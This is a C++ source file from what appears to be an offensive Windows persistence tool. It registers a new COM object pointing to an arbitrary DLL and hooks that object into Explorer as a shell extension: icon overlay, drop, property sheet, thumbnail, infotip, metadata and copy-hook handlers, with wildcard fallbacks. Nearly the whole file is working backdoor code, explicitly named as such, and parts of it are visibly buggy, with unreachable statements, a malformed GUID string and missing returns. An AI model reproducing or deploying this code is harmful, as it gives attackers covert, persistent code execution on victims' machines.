#include "reg.h"
#include "logging.h"

/*
#define HKCU 0
#define HKCR 1
*/


/*
#define ICON_OVERLAY
#define ICON_HANDLER
#define DROP_HANDLER
#define PROPERTY_SHEET_HANDLER
#define THUMBNAIL_IMAGE_HANDLER
#define INFOTIP_HANDLER
#define METADATA_HANDLER
#define COPY_HOOK_HANDLER
*/

#include <cwchar>

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

namespace reg {

	HKEY AddKey(HKEY hKey, CONST WCHAR* subkey) {


		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HRESULT hResult = NULL;
		OLECHAR* guidString = { 0 };
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;


		std::wstring logmsg = L"Adding New Registry Key ";

		if (hKey == HKEY_LOCAL_MACHINE) logmsg.append(L"HKEY_LOCAL_MACHINE\\");
		else if (hKey == HKEY_CURRENT_USER) logmsg.append(L"HKEY_CURRENT_USER\\");
		else if (hKey == HKEY_CLASSES_ROOT) logmsg.append(L"HKEY_CLASSES_ROOT\\");
		else if (hKey == HKEY_CURRENT_CONFIG) logmsg.append(L"HKEY_CURRENT_CONFIG\\");
		else if (hKey == HKEY_PERFORMANCE_DATA) logmsg.append(L"HKEY_PERFORMANCE_DATA\\");
		else if (hKey == HKEY_PERFORMANCE_NLSTEXT) logmsg.append(L"HKEY_PERFORMANCE_NLSTEXT\\");
		else if (hKey == HKEY_PERFORMANCE_TEXT) logmsg.append(L"HKEY_PERFORMANCE_TEXT\\");

		logmsg += std::wstring(subkey);

		logging::log(LVL_INFO, logmsg.c_str());
		status = RegCreateKeyExW(hKey, subkey, NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
		if (status == ERROR_SUCCESS) {

			logging::log(LVL_INFO, L"Successfully Created New Registry Key");
			return hkResult;


		}
		else {

			logging::log(LVL_FATAL, L"Error Creating New Registry Key");

		}



	}
	
	LSTATUS AddDefaultValue(HKEY hkResult, GUID guid) {

		HRESULT hResult;
		OLECHAR* guidString;

		hResult = StringFromCLSID(guid, &guidString);
		size_t sz = wcslen(guidString);
		return RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);

	}

	std::wstring ResolveProgId(CONST WCHAR* ext) {

		HKEY  hkResult = NULL;
		std::wstring logstr;
		LSTATUS stat = NULL;

		WCHAR buf1[MAX_VALUE_NAME];
		BYTE buf2[MAX_VALUE_NAME];

		DWORD sz1 = MAX_VALUE_NAME;
		DWORD sz2 = MAX_VALUE_NAME;

		logstr = L"Resolving ProgID for " + std::wstring(ext);
		logging::log(LVL_INFO, logstr.c_str());

		stat = RegOpenKeyExW(HKEY_CLASSES_ROOT, ext, NULL, KEY_QUERY_VALUE, &hkResult);
		if (stat == ERROR_SUCCESS) {

			stat = RegEnumValueW(hkResult, NULL, buf1, &sz1, NULL, NULL, buf2, &sz2);
			if (stat == ERROR_SUCCESS) {

				logstr = L"Successfully Resolved ProgId for the Extension (" + std::wstring((WCHAR*)buf2) + L")";
				logging::log(LVL_INFO, logstr.c_str());
				return std::wstring((WCHAR*)buf2);

			}
			else {

				logging::log(LVL_FATAL, L"Unable to Resolve ProgId for the Extension");

			}

		}
		else {

			logging::log(LVL_FATAL, L"Error Opening Key");

		}

	}

	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HKEY hKey = (Type) ? HKEY_CLASSES_ROOT : HKEY_CURRENT_USER;
		GUID objGuid = { NULL };
		HRESULT hResult = NULL;
		OLECHAR* guidString;
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;
		std::wstring subKey;
		std::wstring logmsg;


		hResult = CoCreateGuid(&objGuid);
		if (hResult == S_OK) {

			hResult = StringFromCLSID(objGuid, &guidString); // need to check this

			if (hKey == HKEY_CURRENT_USER) {
				subKey = L"Software\\Classes\\CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";
			}
			else {

				subKey = L"CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";

			}

			CoTaskMemFree(guidString);

			logmsg = L"Creating Backdoor COM Object Reg Key ";
			logmsg = logmsg + std::wstring((hKey == HKEY_CLASSES_ROOT) ? L"HKCR\\" : L"HKCU\\") + subKey;
			logging::log(LVL_INFO, logmsg.c_str());
			hkResult = AddKey(hKey, subKey.c_str());
			if (hkResult) {

				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)DllPath.c_str(), (DWORD)DllPath.size() * 2);
				if (status == ERROR_SUCCESS) {

					const WCHAR* ThreadingModel = L"Apartment";
					status = RegSetValueExW(hkResult, L"ThreadingModel", NULL, REG_SZ, (const BYTE*)ThreadingModel, sizeof(ThreadingModel) * 2 + 2);

					if (status == ERROR_SUCCESS) {

						return objGuid;

					}
					else {

						// error adding reg value (ThreadingModel)
						logging::log(LVL_FATAL, L"Unable to Register Values (ThreadingModel)");

					}

				}
				else {

					// error adding reg value (DLL Path)
					CloseHandle(hkResult);
					logging::log(LVL_FATAL, L"Unable to Register Values (DLLPATH)");

				}

			}
			else {

				// error creating reg key
				logging::log(LVL_FATAL, L"Error Creating Registry Key");

			}

		}
		else {

			logging::log(LVL_FATAL, L"Error Generating GUID");

		}

		return objGuid;


	}

	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HRESULT hResult = NULL;

		std::wstring strExt;
		std::wstring progId;


		switch (type) {

		case ICON_OVERLAY:

			hkResult = AddKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\BackdoorOverlay\\");
			if (hkResult) {


				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
					break;

					OLECHAR* guidString;
					hResult = StringFromCLSID(Guid, &guidString);
					size_t sz = wcslen(guidString);
					status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");

					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Overlay Handler");

					}

					break;
				}
				break;
		case ICON_HANDLER:
			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\IconHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Handler");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_FATAL, L"Error Extension Needed for Technique");

			}
			break;

		case DROP_HANDLER:
			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\DropHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_WARNING, L"No Extension Was Provided For Drop Handler, Using Wildcard (*) Drop Handler");
				progId = std::wstring(L"*\\shellex\\DropHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");

					}
					break;
				}
				break;
			}
			break;

		case PROPERTY_SHEET_HANDLER:

			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\PropertySheetHandlers\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_WARNING, L"No Extension Was Provided For PropertyHandler, Using Wildcard (*) PropertyHandler");
				progId = std::wstring(L"*\\shellex\\PropertySheetHandlers\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");

					}
					break;
				}

			}
			break;

		case THUMBNAIL_IMAGE_HANDLER:
			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\E357FCCD-A995-4576-B01F-234630154E96}\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_WARNING, L"No Extension Was Provided For Thumbnail Image Handler, Using Wildcard (*)");
				progId = std::wstring(L"*\\shellex\\E357FCCD-A995-4576-B01F-234630154E96}\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");

					}
					break;
				}
				break;
			}

		case INFOTIP_HANDLER:
			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\{00021500-0000-0000-C000-000000000046}");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor Infotip Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor Infotip Handler");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_WARNING, L"No Extension Was Provided For Infotip Handler, Using Wildcard (*)");
				progId = std::wstring(L"*\\shellex\\{00021500-0000-0000-C000-000000000046}\\");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor Infotip Handler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor Infotip Handler");

					}
					break;
				}
				break;
			}
			break;
		case METADATA_HANDLER:
			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\PropertyHandler\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_WARNING, L"No Extension Was Provided For PropertyHandler, Using Wildcard (*) PropertyHandler");
				progId = std::wstring(L"*\\shellex\\PropertyHandler\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");

					}
					break;
				}
				break;
			}
			break;
		case COPY_HOOK_HANDLER:
			if (ext) {

				strExt = std::wstring(ext);
				progId = ResolveProgId(strExt.c_str());
				progId.append(L"\\shellex\\CopyHookHandlers\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor CopyHookHandlers");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor CopyHookHandlers");

					}
					break;
				}
				break;

			}
			else {

				logging::log(LVL_WARNING, L"No Extension Was Provided For CopyHookHandlers, Using Wildcard (*)");
				progId = std::wstring(L"*\\shellex\\CopyHookHandlers\\BackdoorHandler");
				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
				if (hkResult) {

					status = AddDefaultValue(hkResult, Guid);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor CopyHookHandlers");
						break;
					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor CopyHookHandlers");

					}
					break;
				}
				break;
			}
			break;

			return (status == ERROR_SUCCESS) ? TRUE : FALSE;

			}


		}

		
	}
	
	BOOL RemoveTechnique(DWORD type, WCHAR* ext) {

		return TRUE;

	}
}
